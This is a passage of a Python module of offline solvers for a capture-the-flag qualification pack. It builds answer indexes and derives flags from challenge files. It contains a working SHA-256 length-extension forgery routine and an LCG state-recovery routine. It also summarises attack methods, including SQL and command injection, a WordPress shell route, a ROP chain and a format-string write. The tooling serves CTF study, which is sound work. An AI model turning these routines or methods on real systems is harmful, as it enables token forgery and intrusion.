#!/usr/bin/env python3
"""Offline solvers and evidence builders for the historical ICO quals pack.

The real qualification pack is different from the synthetic ``task.txt`` pack
handled by :mod:`ico_task_solvers`.  Some tasks contain files that can be
solved locally, while the web/crypto services only have a protocol description
in the saved materials.  This module keeps those two cases explicit: local
answers are candidates backed by derived artifacts, and service tasks produce
offline playbooks until an authorized transcript is supplied.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import json
import math
import os
import re
import struct
import time
import zipfile
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Iterable, Sequence

from ico_scan_core import CommandRunner
from ico_solver_engine import SolverLimits
from ico_universal_forensics import parse_pcap_bytes


MAX_BYTES = 100 * 1024 * 1024
MAX_FILES = 200
FLAG_RE = re.compile(r"(?i)(?:ico|ctf|flag)\{[^{}\r\n]{1,256}\}")
WALKTHROUGH_FILENAMES = ("ICO_full_walkthrough.md", "ico_ctf_writeup.md")
ROOT_MARKERS = {
    "ico_ctf_writeup.md",
    "rev_zero.zip",
    "wolf_protocol.zip",
    "can_you_hear.zip",
    "five_shards.zip",
    "aezakmi",
    "journal",
}
ROOT_MARKER_ALIASES = {
    "can_you_hear_the_flag.zip": "can_you_hear.zip",
}
QUALS_FILE_ALIASES = {
    "can_you_hear.zip": ("can_you_hear_the_flag.zip",),
    "aezakmi": ("chall",),
    "journal": ("chall(1)",),
}
SERVICE_IDS = ("northstar", "backdoor", "pixelmart", "vip-club")
QUALS_TASK_ORDER = (
    "northstar",
    "backdoor",
    "pixelmart",
    "vip-club",
    "wolf-protocol",
    "rev-zero",
    "can-you-hear",
    "five-shards",
    "aezakmi",
    "journal-operator",
)
MAX_LCG_HIDDEN_BITS = 24
MAX_LCG_ROUNDS = 1000
WOLF_ARTIFACT_SHA256 = "ba808d0cf9fa673dd161c983f6709e6cdc05f96e70b425cc4203e32e9f808f21"
_WOLF_TARGET = bytes.fromhex(
    "204fce1173dd734e50722b8dc91af48262a87e49b8cace426f64aed9aa5a45a0b842c0"
)
_WOLF_LCG_MULTIPLIER = 6364136223846793005
_WOLF_LCG_INCREMENT = 1442695040888963407
_WOLF_MASK64 = (1 << 64) - 1
_WOLF_SBOX_SEED = 0xDEADBEEF13370042
_WOLF_KEY_SEED = 0xBEEFCAFE0BADF00D
_AEZAKMI_ARTIFACT_SHA256 = "0d0e8450d42330acba3b352c8b89a2003e7af763c2543fc26806c4b7cf8fa7f5"
_JOURNAL_ARTIFACT_SHA256 = "c6c9847fb47b7a74fa50ced0ae77d5083888d284ff3d49042f90ef930489fcf9"

QUALS_NEXT_ACTIONS = {
    "candidate": "Copy only after checking the task's required acceptance signal.",
    "candidate-review": "Review the recorded evidence manually and save the confirmation before using a value or payload.",
    "payload-ready": "Run the static payload only in an explicitly authorized task copy and save its response.",
    "requires-authorized-session": "Supply a saved authorized transcript; the scanner will parse it offline.",
    "no-candidate": "Inspect the recorded derived artifacts and condition for another deterministic transform.",
    "failed": "Read the recorded error and repair the input or solver boundary.",
    "missing-artifact": "Provide the task artifact or a saved authorized transcript.",
}


@dataclass
class QualsTaskResult:
    task_id: str
    task_dir: Path
    solver: str
    status: str = "failed"
    steps: list[dict[str, Any]] = field(default_factory=list)
    candidates: list[dict[str, Any]] = field(default_factory=list)
    references: list[dict[str, Any]] = field(default_factory=list)
    artifacts: list[str] = field(default_factory=list)
    error: str | None = None
    next_action: str | None = None

    def to_dict(self) -> dict[str, Any]:
        value = asdict(self)
        value["next_action"] = self.next_action or QUALS_NEXT_ACTIONS.get(
            self.status,
            "Inspect the recorded evidence and solver steps.",
        )
        return _jsonable(value)


def _jsonable(value: Any) -> Any:
    if isinstance(value, Path):
        return str(value)
    if isinstance(value, bytes):
        return value.hex()
    if isinstance(value, dict):
        return {str(key): _jsonable(item) for key, item in value.items()}
    if isinstance(value, (list, tuple)):
        return [_jsonable(item) for item in value]
    return value


def _safe_name(value: str) -> str:
    clean = re.sub(r"[^A-Za-z0-9_.-]+", "_", value).strip("_")
    return clean or "artifact"


def _new_result(task_dir: Path, task_id: str, solver: str) -> QualsTaskResult:
    return QualsTaskResult(task_id=task_id, task_dir=task_dir.resolve(), solver=solver)


def _step(result: QualsTaskResult, name: str, status: str = "ok", **details: Any) -> None:
    result.steps.append({"name": name, "status": status, "details": _jsonable(details)})


def _artifact_root(output_dir: Path, task_id: str) -> Path:
    root = (output_dir / "artifacts" / "ico-quals" / _safe_name(task_id)).resolve()
    root.mkdir(parents=True, exist_ok=True)
    return root


def _write_artifact(result: QualsTaskResult, output_dir: Path, name: str, data: bytes | str) -> Path:
    root = _artifact_root(output_dir, result.task_id)
    path = (root / _safe_name(name)).resolve()
    path.relative_to(root)
    if isinstance(data, str):
        path.write_text(data, encoding="utf-8")
    else:
        if len(data) > MAX_BYTES:
            raise ValueError(f"derived artifact exceeds byte limit: {len(data)} > {MAX_BYTES}")
        path.write_bytes(data)
    result.artifacts.append(str(path))
    return path


def _flag_values(data: bytes | str) -> list[str]:
    text = data.decode("utf-8", errors="replace") if isinstance(data, bytes) else data
    return list(dict.fromkeys(match.group(0) for match in FLAG_RE.finditer(text)))


def _ocr_near_values(data: bytes | str) -> list[dict[str, str]]:
    """Return conservative OCR near-misses for manual review only.

    Tesseract often drops the opening brace while preserving an ``ico`` prefix
    and closing brace.  Inserting that delimiter is useful evidence, but the
    body remains untouched and the value is never promoted to a candidate.
    Some segmentation modes corrupt the prefix entirely; long, mostly
    hexadecimal tokens ending in a brace are then exposed as raw review hints.
    """

    text = data.decode("utf-8", errors="replace") if isinstance(data, bytes) else data
    pattern = re.compile(r"(?i)\b(ico|ic0)(?!\{)([A-Za-z0-9_$!@#%.,:+\-/]{8,256})\}")
    hex_like_pattern = re.compile(r"(?i)\b([a-z0-9]{28,64})\}")
    values: list[dict[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or _flag_values(line):
            continue
        matched_prefix = False
        for match in pattern.finditer(line):
            prefix = "ico"
            normalized = f"{prefix}{{{match.group(2)}}}"
            key = (normalized, line)
            if key in seen:
                continue
            seen.add(key)
            values.append(
                {
                    "raw": line,
                    "normalized": normalized,
                    "reason": "opening delimiter inferred for manual review only; not promoted to a candidate",
                }
            )
            matched_prefix = True
        if matched_prefix or any(value["raw"] == line for value in values):
            continue
        for match in hex_like_pattern.finditer(line):
            token = match.group(1)
            hex_chars = sum(char in "0123456789abcdefABCDEF" for char in token)
            if hex_chars / len(token) < 0.8:
                continue
            key = (line, line)
            if key in seen:
                continue
            seen.add(key)
            values.append(
                {
                    "raw": line,
                    "normalized": line,
                    "reason": "long hex-like OCR token; flag prefix and opening delimiter not inferred",
                }
            )
            break
    return values


def recover_lcg_predictions(text: str) -> dict[str, Any]:
    """Recover a small LCG from a saved PixelMart banner, without networking."""

    values: dict[str, int] = {}
    for match in re.finditer(r"\b(m|x0|x1|x2_top|x3|hidden_bits|rounds)\s*=\s*(0x[0-9a-f]+|\d+)", text, re.IGNORECASE):
        values[match.group(1).lower()] = int(match.group(2), 0)
    required = {"m", "x0", "x1", "x2_top", "x3", "hidden_bits", "rounds"}
    missing = sorted(required - values.keys())
    if missing:
        raise ValueError(f"LCG transcript missing fields: {', '.join(missing)}")
    m = values["m"]
    hidden_bits = values["hidden_bits"]
    rounds = values["rounds"]
    if m <= 1 or hidden_bits < 0 or hidden_bits > MAX_LCG_HIDDEN_BITS:
        raise ValueError("LCG modulus or hidden-bit count is outside the offline bound")
    if rounds < 0 or rounds > MAX_LCG_ROUNDS:
        raise ValueError("LCG round count is outside the offline bound")
    delta = (values["x1"] - values["x0"]) % m
    gcd_value = math.gcd(delta, m)
    modulus = m // gcd_value
    if modulus <= 1 or (delta // gcd_value) % modulus == 0:
        raise ValueError("LCG transition has no usable modular inverse")
    inverse = pow(delta // gcd_value, -1, modulus)
    candidates: list[tuple[int, int, int]] = []
    for low in range(1 << hidden_bits):
        x2 = (values["x2_top"] << hidden_bits) | low
        difference = (x2 - values["x1"]) % m
        if difference % gcd_value:
            continue
        a0 = (difference // gcd_value * inverse) % modulus
        for k in range(gcd_value):
            a = a0 + k * modulus
            c = (values["x1"] - a * values["x0"]) % m
            if (a * x2 + c) % m == values["x3"]:
                candidates.append((a, c, x2))
                if len(candidates) > 1000:
                    raise ValueError("LCG candidate set exceeds offline bound")
    if len(candidates) != 1:
        raise ValueError(f"LCG recovery expected one parameter set, found {len(candidates)}")
    a, c, x2 = candidates[0]
    predictions: list[int] = []
    state = values["x3"]
    for _ in range(rounds):
        state = (a * state + c) % m
        predictions.append(state)
    return {
        "parameters": {"a": a, "c": c, "x2": x2},
        "predictions": predictions,
        "modulus": m,
        "hidden_bits": hidden_bits,
        "rounds": rounds,
    }


_SHA256_K = (
    0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5,
    0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3, 0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174,
    0xE49B69C1, 0xEFBE4786, 0x0FC19DC6, 0x240CA1CC, 0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA,
    0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7, 0xC6E00BF3, 0xD5A79147, 0x06CA6351, 0x14292967,
    0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13, 0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85,
    0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3, 0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070,
    0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5, 0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3,
    0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208, 0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2,
)
_MASK32 = 0xFFFFFFFF


def _rotr32(value: int, count: int) -> int:
    return ((value >> count) | (value << (32 - count))) & _MASK32


def _sha256_compress(state: list[int], block: bytes) -> list[int]:
    words = [int.from_bytes(block[index : index + 4], "big") for index in range(0, 64, 4)]
    for index in range(16, 64):
        s0 = _rotr32(words[index - 15], 7) ^ _rotr32(words[index - 15], 18) ^ (words[index - 15] >> 3)
        s1 = _rotr32(words[index - 2], 17) ^ _rotr32(words[index - 2], 19) ^ (words[index - 2] >> 10)
        words.append((words[index - 16] + s0 + words[index - 7] + s1) & _MASK32)
    a, b, c, d, e, f, g, h = state
    for index in range(64):
        s1 = _rotr32(e, 6) ^ _rotr32(e, 11) ^ _rotr32(e, 25)
        choose = (e & f) ^ ((~e) & g)
        t1 = (h + s1 + choose + _SHA256_K[index] + words[index]) & _MASK32
        s0 = _rotr32(a, 2) ^ _rotr32(a, 13) ^ _rotr32(a, 22)
        majority = (a & b) ^ (a & c) ^ (b & c)
        t2 = (s0 + majority) & _MASK32
        h, g, f, e, d, c, b, a = g, f, e, (d + t1) & _MASK32, c, b, a, (t1 + t2) & _MASK32
    return [(left + right) & _MASK32 for left, right in zip(state, (a, b, c, d, e, f, g, h))]


def _sha256_padding(total_length: int) -> bytes:
    bit_length = (total_length * 8) & 0xFFFFFFFFFFFFFFFF
    padding = b"\x80" + b"\x00" * ((56 - (total_length + 1) % 64) % 64)
    return padding + bit_length.to_bytes(8, "big")


def sha256_length_extend(known_hexdigest: str, known_total_len: int, suffix: bytes) -> tuple[str, bytes]:
    """Continue SHA-256 from a known secret-prefix MAC state."""

    if known_total_len < 0 or len(known_hexdigest) != 64:
        raise ValueError("invalid SHA-256 extension inputs")
    try:
        digest = bytes.fromhex(known_hexdigest)
    except ValueError as exc:
        raise ValueError("token is not hexadecimal SHA-256") from exc
    state = [int.from_bytes(digest[index : index + 4], "big") for index in range(0, 32, 4)]
    glue = _sha256_padding(known_total_len)
    total_before_suffix = known_total_len + len(glue)
    data = suffix + _sha256_padding(total_before_suffix + len(suffix))
    for offset in range(0, len(data), 64):
        state = _sha256_compress(state, data[offset : offset + 64])
    new_digest = b"".join(value.to_bytes(4, "big") for value in state).hex()
    return new_digest, glue


_WALKTHROUGH_TASK_ALIASES = {
    "northstar": "northstar",
    "backdoor": "backdoor",
    "pixelmart": "pixelmart",
    "vip club": "vip-club",
    "wolf protocol": "wolf-protocol",
    "rev zero": "rev-zero",
    "can you hear the flag": "can-you-hear",
    "five shards": "five-shards",
    "aezakmi": "aezakmi",
    "journal operator": "journal-operator",
}


# The walkthrough is part of the supplied historical pack, so it is useful
# evidence when building a local study bundle.  It is intentionally written to
# a separate artifact and never promoted to ``candidates``: a copied answer
# cannot prove that a current service accepts the same value.
HISTORICAL_METHODS = {
    "northstar": (
        "SQL injection in the login form, followed by the authenticated node-export "
        "command-injection path.  Record both returned values from the authorized task host."
    ),
    "backdoor": (
        "Enumerate the WordPress REST root, discover the wp2shell namespace and secret route, "
        "then send a base64 command in JSON field c to the authorized task host."
    ),
    "pixelmart": (
        "Recover the LCG from m, x0, x1, x2_top, x3 and hidden_bits using gcd and a modular "
        "inverse, then submit only the predicted states to the authorized service."
    ),
    "vip-club": (
        "Use SHA-256 secret-prefix length extension: preserve data0 and token0, construct glue "
        "padding for the documented secret length, and append &level=admin."
    ),
    "wolf-protocol": (
        "Reverse the 35-byte reversible transform by differential execution of the supplied "
        "ELF in an authorized local amd64 sandbox; do not brute-force the flag."
    ),
    "rev-zero": (
        "Read the JavaScript equality check, Base64-decode its constant, then reverse the "
        "decoded bytes."
    ),
    "can-you-hear": (
        "Find the RIFF/WAVE trailer after PNG IEND, render a spectrogram, and visually confirm "
        "the text rather than trusting ambiguous OCR."
    ),
    "five-shards": (
        "Preserve the corrupted WAV header as the repeating XOR key, extract ordered Base32 "
        "DNS shards from the PCAP, and decode the concatenated ciphertext."
    ),
    "aezakmi": (
        "Use the supplied non-PIE ELF to derive the 72-byte offset and ROP chain "
        "(ret, pop rdi; ret, magic, win) in a local sandbox."
    ),
    "journal-operator": (
        "Use the supplied format-string bug and %n to write the documented admin value at the "
        "binary's is_admin address, then verify locally."
    ),
}


def extract_walkthrough_references(path: Path) -> list[dict[str, Any]]:
    """Extract explicitly printed historical flags as non-solver references.

    The values are deliberately kept out of ``candidates``.  A walkthrough is
    evidence about a historical run, not proof that the current platform would
    accept the value.
    """

    text = path.read_text(encoding="utf-8", errors="replace")
    headings = list(re.finditer(r"(?m)^#{1,6}\s+\d+\.\s+([^\r\n]+)\s*$", text))
    references: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    for index, heading in enumerate(headings):
        title = heading.group(1).strip()
        normalized_title = title.lower().rstrip(" ?!.")
        task_id = _WALKTHROUGH_TASK_ALIASES.get(normalized_title)
        if task_id is None:
            continue
        end = headings[index + 1].start() if index + 1 < len(headings) else len(text)
        section = text[heading.end() : end]
        for match in FLAG_RE.finditer(section):
            value = match.group(0)
            line_start = section.rfind("\n", 0, match.start()) + 1
            line_end = section.find("\n", match.end())
            if line_end < 0:
                line_end = len(section)
            context = section[line_start:line_end]
            if "local_test" in value.lower() or "local_journal" in value.lower():
                continue
            if re.search(r"ошибоч|отклон|rejected|not the flag|не является флагом", context, re.IGNORECASE):
                continue
            key = (task_id, value)
            if key in seen:
                continue
            seen.add(key)
            references.append(
                {
                    "task_id": task_id,
                    "value": value,
                    "state": "reference-only",
                    "source": f"{path}#{title}",
                    "reason": "historical walkthrough; not platform-confirmed by this run",
                }
            )
    return references


def write_historical_solution_artifacts(
    results: Sequence[QualsTaskResult],
    output_dir: Path,
    *,
    walkthrough: Path | None = None,
) -> list[str]:
    """Write one explicit, reference-only solution note per historical task.

    The old report exposed the values only in a large answer table.  That made
    it look as if only the two locally-derived tasks had an answer.  These
    small files make all available historical solutions discoverable while
    preserving the evidence boundary: they say where the value came from and
    never add it to ``result.candidates``.
    """

    written: list[str] = []
    source = str(walkthrough) if walkthrough else "supplied historical walkthrough"
    for result in results:
        if not result.references:
            continue
        lines = [
            f"# {result.task_id} historical solution reference",
            "",
            "Evidence state: `reference-only`.",
            "This value was printed in the supplied historical walkthrough; it is not a current service or platform acceptance signal.",
            "",
            f"Method: {HISTORICAL_METHODS.get(result.task_id, 'See the supplied walkthrough for the task-specific derivation.')}",
            "",
            f"Source: `{source}`",
            "",
            "## Values",
            "",
        ]
        for reference in result.references:
            lines.append(f"- `{reference['value']}`")
        path = _write_artifact(result, output_dir, "historical-solution.md", "\n".join(lines) + "\n")
        _step(
            result,
            "write-historical-solution",
            "reference-only",
            output=str(path),
            source=source,
            submitted=False,
        )
        written.append(str(path))
    return written


def _add_candidates(
    result: QualsTaskResult,
    values: Iterable[str],
    *,
    evidence: str,
    state: str = "candidate",
    **metadata: Any,
) -> None:
    for value in values:
        if any(item.get("value") == value for item in result.candidates):
            continue
        result.candidates.append(
            {
                "value": value,
                "state": state,
                "verification": {
                    "status": state,
                    "algorithm": "sha256",
                    "expected": None,
                },
                "evidence": evidence,
                **_jsonable(metadata),
            }
        )
    if result.candidates:
        result.status = "candidate"


def build_qual_answer_matrix(results: Sequence[QualsTaskResult]) -> list[dict[str, Any]]:
    """Build a complete, evidence-labelled view of every real-quals task.

    The normal candidate list intentionally contains only values derived by a
    solver in the current run.  A qualification walkthrough can still provide
    useful historical answers, so this matrix exposes both channels without
    collapsing them into one verification state.
    """

    by_task = {result.task_id: result for result in results}
    ordered_ids = list(dict.fromkeys((*QUALS_TASK_ORDER, *by_task.keys())))
    next_actions = {
        "candidate": "Copy only after checking the task's required acceptance signal.",
        "candidate-review": "Review the recorded evidence manually and save the confirmation before using a value or payload.",
        "payload-ready": "Run the static payload only in an explicitly authorized task copy and save its response.",
        "requires-authorized-session": "Supply a saved authorized transcript; the scanner will parse it offline.",
        "no-candidate": "Inspect the recorded derived artifacts and condition for another deterministic transform.",
        "failed": "Read the recorded error and repair the input or solver boundary.",
    }
    matrix: list[dict[str, Any]] = []
    for task_id in ordered_ids:
        result = by_task.get(task_id)
        if result is None:
            matrix.append(
                {
                    "task_id": task_id,
                    "status": "missing",
                    "solver": None,
                    "answer_state": "missing-artifact",
                    "local_candidates": [],
                    "historical_references": [],
                    "artifacts": [],
                    "next_action": "Provide the task artifact or a saved authorized transcript.",
                }
            )
            continue
        historical_values = [item.get("value") for item in result.references if item.get("value")]
        candidate_states = {
            item.get("state")
            for item in result.candidates
            if item.get("value")
        }
        has_transcript = "transcript-derived" in candidate_states
        has_local = any(state != "transcript-derived" for state in candidate_states)
        if has_local and has_transcript:
            answer_state = "local-and-transcript"
        elif has_local and historical_values:
            answer_state = "local-and-historical"
        elif has_transcript and historical_values:
            answer_state = "transcript-and-historical"
        elif has_local:
            answer_state = "local-candidate"
        elif has_transcript:
            answer_state = "transcript-derived"
        elif historical_values:
            answer_state = "historical-reference"
        elif result.status == "payload-ready":
            answer_state = "payload-ready"
        elif result.status == "candidate-review":
            answer_state = "manual-review"
        elif result.status == "requires-authorized-session":
            answer_state = "session-required"
        else:
            answer_state = result.status
        matrix.append(
            {
                "task_id": task_id,
                "status": result.status,
                "solver": result.solver,
                "answer_state": answer_state,
                "local_candidates": list(result.candidates),
                "historical_references": list(result.references),
                "artifacts": list(result.artifacts),
                "next_action": next_actions.get(result.status, "Inspect the recorded evidence and solver steps."),
                "error": result.error,
            }
        )
    return _jsonable(matrix)


def write_qual_answer_index(results: Sequence[QualsTaskResult], output_dir: Path) -> dict[str, Any]:
    """Persist a human and machine-readable answer index for a quals run."""

    write_historical_solution_artifacts(results, output_dir)
    matrix = build_qual_answer_matrix(results)
    root = (output_dir / "artifacts" / "ico-quals" / "answer-index").resolve()
    root.mkdir(parents=True, exist_ok=True)
    json_path = root / "answers.json"
    markdown_path = root / "answers.md"
    json_path.write_text(json.dumps(matrix, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    lines = [
        "# ICO real-quals answer index",
        "",
        "This index keeps current-run local evidence separate from historical walkthrough references.",
        "A historical value is not a fresh platform acceptance signal.",
        "",
        "| Task | Run status | Answer state | Local candidates | Historical references | Next action |",
        "|---|---|---|---|---|---|",
    ]
    for item in matrix:
        local = ", ".join(
            f"`{candidate['value']}`"
            for candidate in item["local_candidates"]
            if candidate.get("value")
        ) or "—"
        historical = ", ".join(
            f"`{reference['value']}`" for reference in item["historical_references"] if reference.get("value")
        ) or "—"
        action = str(item.get("next_action", "")).replace("|", "\\|")
        lines.append(
            f"| `{item['task_id']}` | `{item['status']}` | `{item['answer_state']}` | "
            f"{local} | {historical} | {action} |"
        )
    lines.extend(
        [
            "",
            "## Evidence states",
            "",
            "- `local-candidate`: derived from a local challenge artifact in this run.",
            "- `transcript-derived`: extracted from a saved authorized task transcript.",
            "- `payload-ready`: a static payload was built; no binary execution or service acceptance is implied.",
            "- `historical-reference`: copied from the supplied walkthrough and kept separate from current candidates.",
            "- `local-and-transcript` / `transcript-and-historical`: multiple evidence channels are present; inspect the table for each value.",
            "- `session-required`: the task needs a saved authorized service transcript for offline parsing.",
            "- `manual-review`: derived evidence or a payload input still needs human verification.",
        ]
    )
    markdown_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    text_path = root / "answers.txt"
    all_values: list[str] = []
    for item in matrix:
        for candidate in item["local_candidates"]:
            if candidate.get("value"):
                all_values.append(str(candidate["value"]))
        for reference in item["historical_references"]:
            if reference.get("value"):
                all_values.append(str(reference["value"]))
    text_path.write_text("\n".join(dict.fromkeys(all_values)) + "\n", encoding="utf-8")
    bundle_lines = [
        "# ICO real-quals solution bundle",
        "",
        "This bundle lists every answer available from the local pack.  Local candidates and payloads are derived in this run; historical values are reference-only.",
        "",
        "| Task | Status | Answer state | Values | Evidence file |",
        "|---|---|---|---|---|",
    ]
    for item in matrix:
        values = [
            candidate.get("value")
            for candidate in item["local_candidates"]
            if candidate.get("value")
        ] + [
            reference.get("value")
            for reference in item["historical_references"]
            if reference.get("value")
        ]
        values_text = ", ".join(f"`{value}`" for value in dict.fromkeys(values)) or "—"
        evidence = next(
            (
                Path(artifact).name
                for artifact in item.get("artifacts", [])
                if Path(artifact).name == "historical-solution.md"
            ),
            "—",
        )
        bundle_lines.append(
            f"| `{item['task_id']}` | `{item['status']}` | `{item['answer_state']}` | "
            f"{values_text} | `{evidence}` |"
        )
    bundle_lines.extend(
        [
            "",
            "The answer strings in a `historical-solution.md` file come from the supplied walkthrough and must not be described as a fresh platform confirmation.",
        ]
    )
    bundle_path = root / "solution-bundle.md"
    bundle_path.write_text("\n".join(bundle_lines) + "\n", encoding="utf-8")
    unique_answers = {
        (item["task_id"], reference.get("value"))
        for item in matrix
        for reference in item["historical_references"]
        if reference.get("value")
    }
    return {
        "json": str(json_path),
        "markdown": str(markdown_path),
        "text": str(text_path),
        "bundle": str(bundle_path),
        "task_count": len(matrix),
        "historical_task_count": sum(1 for item in matrix if item["historical_references"]),
        "historical_answer_count": len(unique_answers),
    }


def _read_limited(path: Path) -> bytes:
    size = path.stat().st_size
    if size > MAX_BYTES:
        raise ValueError(f"input exceeds byte limit: {size} > {MAX_BYTES}")
    return path.read_bytes()


def _materialize_zip_member(zip_path: Path, member_suffix: str, output_dir: Path, task_id: str) -> Path:
    with zipfile.ZipFile(zip_path) as archive:
        names = [name for name in archive.namelist() if not name.endswith("/")]
        selected = next((name for name in names if name.endswith(member_suffix)), None)
        if selected is None:
            raise FileNotFoundError(f"{member_suffix} not found in {zip_path}")
        data = archive.read(selected)
    root = (output_dir / "sources" / "ico-quals" / _safe_name(task_id)).resolve()
    root.mkdir(parents=True, exist_ok=True)
    path = (root / Path(selected).name).resolve()
    path.relative_to(root)
    path.write_bytes(data)
    return path


def _find_root_file(root: Path, name: str) -> Path | None:
    """Resolve known task filenames case-insensitively, including pack aliases."""

    aliases = QUALS_FILE_ALIASES.get(name.casefold(), ())
    for candidate in (name, *aliases):
        direct = root / candidate
        if direct.is_file():
            return direct.resolve()
    try:
        entries = {item.name.casefold(): item for item in root.iterdir() if item.is_file()}
    except OSError:
        return None
    for candidate in (name, *aliases):
        match = entries.get(Path(candidate).name.casefold())
        if match is not None:
            return match.resolve()
    return None


def _locate(root: Path, relative: str, archive: str | None, output_dir: Path, task_id: str) -> Path:
    direct = root / relative
    if direct.is_file():
        return direct.resolve()
    if archive:
        archive_path = _find_root_file(root, archive)
        if archive_path is not None:
            return _materialize_zip_member(archive_path, Path(relative).name, output_dir, task_id)
    raise FileNotFoundError(f"missing {relative} and {archive or 'archive'} under {root}")


def discover_ico_quals_roots(inputs: Sequence[str]) -> list[Path]:
    """Find real qualification roots from marker files, without following links."""

    found: set[Path] = set()

    def inspect(path: Path) -> None:
        if not path.is_dir() or path.name.startswith(".") or path.name in {"ico-scan-runs", "artifacts", "commands"}:
            return
        try:
            names = {item.name.casefold() for item in path.iterdir() if item.is_file()}
        except OSError:
            return
        canonical_names = {ROOT_MARKER_ALIASES.get(name, name) for name in names}
        walkthrough_names = {name.casefold() for name in WALKTHROUGH_FILENAMES}
        if canonical_names & walkthrough_names or len(canonical_names & ROOT_MARKERS) >= 2:
            found.add(path.resolve())

    for raw in inputs:
        candidate = Path(raw).expanduser()
        try:
            path = candidate.resolve()
        except OSError:
            continue
        inspect(path if path.is_dir() else path.parent)
        if path.is_dir():
            for current, directories, _files in __import__("os").walk(path, followlinks=False):
                current_path = Path(current)
                if current_path != path and (current_path.name.startswith(".") or current_path.name in {"ico-scan-runs", "artifacts", "commands"}):
                    directories[:] = []
                    continue
                directories[:] = [name for name in directories if not (current_path / name).is_symlink()]
                inspect(current_path)
    return sorted(found)


def _png_wav_trailer(data: bytes) -> tuple[int, bytes]:
    if not data.startswith(b"\x89PNG\r\n\x1a\n"):
        raise ValueError("expected PNG input")
    offset = 0
    while True:
        offset = data.find(b"RIFF", offset)
        if offset < 0:
            break
        if data[offset + 8 : offset + 12] == b"WAVE":
            return offset, data[offset:]
        offset += 4
    raise ValueError("PNG trailer does not contain a RIFF/WAVE stream")


OCR_MAX_CALLS = 8
OCR_MAX_INPUTS = 4
_OCR_VIEW_ORDER = (
    "spectrum_crop.png",
    "spectrum_zoom.png",
    "text_mask_crop.png",
    "text_mask.png",
    "text_bw.png",
    "text_g.png",
    "text_zoom.png",
    "ocr_text.png",
    "left_text.png",
    "mid.png",
    "right_text.png",
    "part1.png",
    "part2.png",
    "part3.png",
    "ocr1.png",
    "ocr2.png",
    "ambiguous.png",
)


def _sha256_or_none(path: Path) -> str | None:
    try:
        digest = hashlib.sha256()
        with path.open("rb") as handle:
            for chunk in iter(lambda: handle.read(1024 * 1024), b""):
                digest.update(chunk)
        return digest.hexdigest()
    except OSError:
        return None


def plan_ocr_inputs(
    spectrum_path: Path,
    task_dir: Path,
    *,
    focused_spectrum_path: Path | None = None,
    compact_spectrum_path: Path | None = None,
    max_inputs: int = OCR_MAX_INPUTS,
) -> list[dict[str, Any]]:
    """Choose a bounded, provenance-labelled set of OCR views.

    Only the generated spectrum and named preprocessing outputs are eligible.
    An arbitrary image beside the challenge is therefore never pulled into
    OCR merely because it shares a directory.  Byte hashes deduplicate copied
    views before the per-task call budget is applied.
    """

    if max_inputs < 1:
        return []
    root = task_dir.resolve()
    selected: list[dict[str, Any]] = []
    seen_hashes: dict[str, Path] = {}

    def add(path: Path, reason: str, *, allow_missing: bool = False) -> None:
        resolved = path.resolve()
        if not allow_missing and not resolved.is_file():
            return
        digest = _sha256_or_none(resolved)
        if digest is not None:
            duplicate = seen_hashes.get(digest)
            if duplicate is not None:
                return
            seen_hashes[digest] = resolved
        selected.append({"path": str(resolved), "reason": reason, "sha256": digest})

    add(spectrum_path, "generated spectrogram", allow_missing=True)
    if focused_spectrum_path is not None:
        add(focused_spectrum_path, "generated 2-5 kHz spectrogram")
    if compact_spectrum_path is not None:
        add(compact_spectrum_path, "generated compact vertical-crop OCR view")
    for name in _OCR_VIEW_ORDER:
        if len(selected) >= max_inputs:
            break
        add(root / name, f"named preprocessing view: {name}")
    return selected


def solve_rev_zero(path: Path, output_dir: Path) -> QualsTaskResult:
    result = _new_result(path.parent, "rev-zero", "rev-zero-html")
    try:
        data = _read_limited(path)
        text = data.decode("utf-8", errors="replace")
        matches = re.findall(
            r"btoa\s*\(\s*input\.split\(['\"]['\"]\)\.reverse\(\)\.join\(['\"]['\"]\)\s*\)\s*===\s*['\"]([A-Za-z0-9+/=]+)['\"]",
            text,
        )
        if not matches:
            matches = re.findall(r"btoa[\s\S]{0,180}?['\"]([A-Za-z0-9+/]{12,}={0,2})['\"]", text)
        _step(result, "inspect-javascript", constants=len(matches), transform="reverse then Base64")
        for index, token in enumerate(matches):
            try:
                decoded = base64.b64decode(token, validate=True)
            except (binascii.Error, ValueError) as exc:
                _step(result, "base64-decode", "error", token_index=index, error=str(exc))
                continue
            raw_path = _write_artifact(result, output_dir, f"base64-{index}.bin", decoded)
            reversed_path = _write_artifact(result, output_dir, f"reversed-{index}.txt", decoded[::-1])
            _step(result, "base64-decode", token_index=index, output=str(raw_path))
            _step(result, "reverse-input", token_index=index, output=str(reversed_path))
            _add_candidates(result, _flag_values(decoded[::-1]), evidence=str(reversed_path), encoding="base64", reversed=True)
        if not result.candidates and not matches:
            _step(result, "inspect-javascript", "no-match", reason="btoa reverse check not found")
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error)
    if result.error:
        result.status = "failed"
    elif not result.candidates:
        result.status = "no-candidate"
    return result


def solve_can_you_hear(
    path: Path,
    output_dir: Path,
    *,
    runner: Any | None = None,
) -> QualsTaskResult:
    result = _new_result(path.parent, "can-you-hear", "png-trailer-spectrogram")
    runner = runner or CommandRunner(output_dir / "commands")
    try:
